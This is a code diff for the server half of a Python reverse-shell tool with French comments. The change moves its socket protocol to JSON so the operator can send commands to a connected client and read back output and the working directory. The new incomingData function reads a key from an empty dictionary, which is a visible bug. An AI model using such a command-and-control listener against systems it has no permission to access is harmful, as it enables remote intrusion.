@@ -6,6 +6,7 @@ import socket
 import threading
 import os
 import platform
+import json
 
 class Server():
     def __init__(self):
@@ -18,43 +19,53 @@ class Server():
             elif platform.system() == "Windows":
                 os.system("cls")
 
-    def incomingData(self, c, message):
-        quitting = False
-        while not quitting:
-            if message == "exit":
-                quitting = True
+    def encode(self, data):
+        # return json.dumps(data).encode("UTF-8")
+        return bytes(json.dumps(data), "UTF-8")
+         
+    
+    def decode(self, c):
+        data = ""
+        while True:
+            try:
+                data += c.recv(1024).decode("UTF-8").strip()
+                return json.loads(data)
+            except ValueError:
+                continue
+
+    def incomingData(self, c):
+        data = {}
+        while True:
+            if data["message"] == "exit":
                 c.close()
+                break
             else:
                 # TODO: Change print for DAO 
-                print(message)
-                message = c.recv(1024).decode('UTF-8')
+                data = self.decode(c)
+                print(data["message"])
 
-    def incomingReverseShell(self, c, message, SEP):
+    def incomingReverseShell(self, c):
 
-        quitting = False
         # Premier receive donne le current working directory
-        cwd = c.recv(1024).decode('UTF-8')
-        while not quitting:
+        data = self.decode(c)
+        while True:
 
-            command = input(f"{cwd} $> ")
-            if not command.strip():
+            data["command"] = input(f"{data['cwd']} $> ")
+            if not data["command"].strip():
                 continue
-            elif command.lower() == "cls" or command.lower() == "clear":
+            elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
                 self.clrscr()
                 continue
             else:
-                c.send(bytes(command, "UTF-8"))
-                message = c.recv(1024).decode('UTF-8')
+                c.send(self.encode(data))
+                # c.send(bytes(command, "UTF-8"))
+                data = self.decode(c)
             
-            if command.lower() == "exit":
-                quitting = True
+            if data["command"].lower() == "exit":
                 c.close()
-            else:    
-                if len(message.split(SEP)) > 1:
-                    message, cwd = message.split(SEP)
-                else:
-                    cwd = message
-            print(message)
+                break
+        
+            print(data["output"])
 
 
     def main(self):
@@ -84,8 +95,6 @@ class Server():
     # Starting Reverse Shell
         c = None
         addr = None
-        message = 'Waiting for connection'
-        SEP = "<sep>"
 
         s = socket.socket()
 
@@ -103,7 +112,7 @@ class Server():
                 # On crée un thread receiving data
                 connection_handler = threading.Thread(
                     target=self.incomingReverseShell,
-                    args=(c, message, SEP,)
+                    args=(c,)
                 )
                 connection_handler.start()
                 print("\n Nombre de Thread", threading.active_count())
